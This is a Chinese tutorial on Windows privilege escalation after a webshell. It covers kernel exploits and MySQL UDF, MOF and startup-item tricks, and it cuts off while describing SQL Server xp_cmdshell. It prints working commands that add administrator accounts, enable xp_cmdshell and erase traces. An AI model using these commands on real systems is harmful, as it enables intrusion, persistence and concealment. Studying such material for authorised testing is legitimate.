（但是个人在用shadowsocks...dddd)
﻿提权可以有好几种，本篇主要讲利用系统漏洞提权(最常规)和利用数据库提权。数据库这种利用第三方提权的方式通常比较少见
# windows权限提升
当我们getshell一个网站后，大部分情况下我们的权限是非常低的，这个时候提权可以让我们如拥有修改文件之类的强大能力。
一般来说，提权通常是改变用户
> windows: user -> system user->administrator  
>  linux: user->root
  * 提权的方式通常有：
  * 系统漏洞提权
  * 数据库提权
  * 第三方软件/服务提权
  * 系统配置错误提权
如果目的是download服务器文件或者拿下webshell等没必要提权，如果是为了做肉鸡或者上远控
## 系统漏洞提权
常规流程： **获得目标机shell- >查看目标机补丁记录->判断没打的补丁，寻找EXP->利用exp提权**
  1. cmd中systeminfo查看补丁安装情况
  2. 使用补丁在线查询工具:`[blog.neargle.com/win-powerup-exp-index/#](http://blog.neargle.com/win-powerup-exp-index/#)`
  3. 将systeminfo命令得到的补丁信息复制进去，就会给出可用的exp编号
  4. github作者整合了大部分exp：`[github.com/SecWiki/windows-kernel-exploits](http://github.com/SecWiki/windows-kernel-exploits)`(windows-kernel就是代表windows内核)
  5. 将exp上传至目标机
  6. 每个EXP的使用方法不同。如ms14-058上传了exp到靶机后在cmd使用`exp.exe "命令"`就能以system权限执行命令。其他exp的使用方法很可能不同
  7. 获得了高权限在当前网络环境切忌开3389去连，可以用msfvenom生成木马维权，或者创建新用户加入管理员组。不过都会被发现。。
  8. 靶机上在运行msf木马时要用高权限运行，否则反弹回来的shell也是低权限。所以要用之前传上去的exp运行msf木马
## windows数据库提权
这种提权方式已经用的很少了
### mysql数据库提权
mysql提权的必要条件:获取Mysql数据库最高权限 **root** 的账号密码
> 获取方法：
>
>   1. 查看数据库配置文件
>   2. 下载mysql安装路径下的数据文件并破解
>
>   3.
> 安装路径下的data存放的是数据库的信息，root的账号密码存放在mysql下的user表中，完整路径=安装路径+data+mysql+user.myd
>
>   4. 暴力破解
>
>
**mysql的三种提权方式：**
  1. udf提权
  2. mof提权
  3. 启动项提权
#### MOF提权
  * 原理：利用了c:/windows/system32/wbem/mof/目录下的 **nullevt.mof** 文件。该文件每几秒会 **执行** 一次，向其中写入 **cmd命令** 使其被执行
  * 利用条件
  * windows   1. 上传mof文件
>   2. 执行load_file和into dumpfile将文件导出到指定位置  
>  `select load_file('mof目标路径') into dumpfile
> 'c:/windows/system32/wbem/mof/nullevt.mof'`
>
>
> nullevt.mof文件的内容  
>
> 
#### UDF提权
  * 原理：UDF(user defined function)用户自定义函数通过添加新函数，对mysql服务器进行功能扩充，将mysql账号转化为system权限。
  * 方式：通过root权限导出udf.dll到系统目录下，使udf.dell调用cmd
  * 利用条件：
  * windows 2000\XP\2003
  * 账号对mysql有插入和删除权限
  * 对应目录有写权限
> mysql版本对应的udf.dll导出路径：
>
> 数据库版本 | 操作系统 | udf.dll导出路径  
> ---|---|---  
>    >5.1 | 所有操作系统 | mysql **安装目录下的lib\plugin\udf.dll**  
>  
> mysql安装目录查询语句： `select @@basedir`
  * udf 提权步骤
  * select user();\version();\basedir()判断数据库版本、用户和安装目录
  * 如果\lib\plugin目录不存在，可以利用NTFS ADS流创建文件夹  
`select 'xxx' into dumpfile 'mysql目录\\lib:$INDEX_ALLOCATION';`  
`select 'xxx' into dumpfile 'mysql目录\\lib\plugin:$INDEX_ALLOCATION';`  
或者是webshell直接创建
  * 导入udf.dll文件。该文件在sqlmap/data/udf/mysql/目录下有，只是该dll文件是通过异或编码的，可以使用sqlmap/extra/cloak.py解密。
  * 上传udf.dll到指定目录。有webshell就直接传，传不了就select load_file()。
  * 创建自定义函数。`create function **sys_eval** returns string soname 'udf.dll';`  
必须要创建.dll文件中存在的函数才行，可以用十六进制编辑器打开udf.dll文件慢慢找函数，也可以用dumpbin.exe查看。soname指向动态链接库
  * 执行高权限指令：`select sys_eval('whoami');`  
将该用户提升为管理员权限：`select sys_eval("net localgroup administrators ichunqiu /add")`
  * 清除痕迹  
`drop function sys_eval;`  
`delete from mysql.func where name="sys_eval";`
#### 启动项提权
  * 原理：windows开机时候都会有一些开机启动的程序，那时候启动的程序权限都是system，因为是system把他们启动的，利用这点，我们可以将自动化脚本写入启动项，达到提权的目的。将一段vbs脚本导入开机启动项，如果管理员重启了服务器，那么就会自动调用，并执行其中的用户添加及提权命令
  * 利用条件：
  * 目标目录可读写
  * 调用的cmd要有足够权限
  * 重启服务器可以利用导致服务器蓝屏的exp，或者ddos
  * 提权方式
  * 直接将vbs提权脚本上传到启动项目录下
  * sql命令创建添加vbs脚本
vbs提权脚本：
    set wsnetwork=CreateObject("WSCRIPT.NETWORK")
    os="WinNT://"&wsnetwork.ComputerName
    Set ob=GetObject(os) #得到adsi接口
    Set oe=GetObject(os&"/Administrators,group") #用户组
    Set od=ob.Create("user","name") #name为用户名
    od.SetPassword "passwd" #passwd为密码
    od.SetInfo #保存
    Set of=GetObject(os&"/name",user) #得到用户
    oe.add os&"/name"
  * sql命令创建
  * 连接到对方MySQL服务器,进入后查看数据库中有哪些数据表
  * 命令:show tables
  * 默认的情况下，test中没有任何表的存在。
  * 进入test数据库，并创建一个新的表:  
`create table a(cmd text)`//创建了一个新的表，名为a，表中只存放了一个字段，字段名为cmd，为text文本
  * 在表中插入内容，用这三条命令来建立一个VBS的脚本程序:
`insert into a values("set wshshell=createobject(""wscript.shell"")");`  
`insert into a values("a=wshshell.run(""cmd.exe /c net user name passwd
/add"",0)");`  
`insert into a values("b=wshshell.run(""cmd.exe /c net localgroup
administrators name /add"",0)");`
  1. 输出表为一个VBS的脚本文件  
`select * from a into dumpfile "C:\Documents and
Settings\Administrator\“开始”菜单\程序\启动1.vbs";`
  2. 利用其他手段重启电脑
### sql server提权
  * 利用条件
  * 必须获得sa的账号密码或者与sa相同给权限的账号密码，且mssql没有被降权
  * 能执行sql语句。如webshell或者1433端口连接
在windows，sa账号通常是被降权为db-owner的。而不是sysadmin
  * 获取sa号密的方法：
>   1.
> webshell或源码获取。一般在网站的配置文件中存了明文账号密码，常用配置文件如：conn.aspx、config.aspx、config.php等  
>  一般格式如：server=localhost;UID=sa;PWD=passwd;database=db
>   2. 源码泄露
>   3. 嗅探。在局域网中用Cain等工具进行arp嗅探的时候可以抓取到1433端口的数据库明文登录
>   4. 暴力破解
>
#### xp_cmdshell提权
>   * xp_cmdshell:
>
>   * 存储过程：是存储在SQLServer中预先定义好的"sql语言集合"，使用T-SQL语言编写好的脚本共同组成的集合体为存储过程
>
>   * xp_cmdshell脚本：扩展存储过程的脚本，是危险性最高的脚本，可以执行操作系统的任何指令
>   *
> xp_cmdshell在mssql2000中是默认开启的，在mssql2005后的版本中默认禁止。如果用户具有sa权限可以用sp_configure重新开启
>
xp_cmdshell提权过程：  
（2005以前的版本):
  1. 连接数据库：  
`select ame from master.dbo.sysdatabases`获取所有的数据库名
  2. 查看当前版本`select @@version`  
判断当前是否为sa`select is_srvrolemember('sysadmin')`  
判断是否有public权限`select is_srvrolemember('public')`  
判断是否有读写文件权限`select is_srvrolemember('db_owner')`
  3. 查看数据库中是否有xp_cmdshell扩展存储插件，return 1则有  
`select count(*) from master.dbo.sysobjects where xtype='x' and
name='xp_cmdshell';`
（2005后的版本)：
  1. 开启xp_cmdshell
```exec sp_configure 'show advance options',1;//允许修改高级参数  
reconfigure;  
exec sp_configure 'xp_cmshell',1;//打开xp_cmdshell扩展  
reconfigure;
    2. xp_cmdshell执行命令